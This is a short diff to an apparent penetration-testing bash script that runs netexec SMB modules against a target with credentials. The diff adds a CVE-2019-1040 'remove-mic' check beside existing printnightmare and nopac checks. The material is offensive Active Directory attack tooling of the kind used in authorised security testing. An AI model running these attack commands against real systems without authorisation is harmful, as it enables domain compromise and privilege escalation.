@@ -71,6 +71,9 @@ if [[ -n "$password" ]]; then
 	netexec smb $ip -u "$username" -p "$password" -M printnightmare 
 fi
 
+echo -e "\n[*] Attack : CVE-2019-1040 (remove-mic) ..." 
+netexec smb $ip -u "$username" -p "$password" -M remove-mic
+
 echo -e "\n[*] Attack : nopac ..." 
 netexec smb $ip -u "$username" -p "$password" -M nopac
 
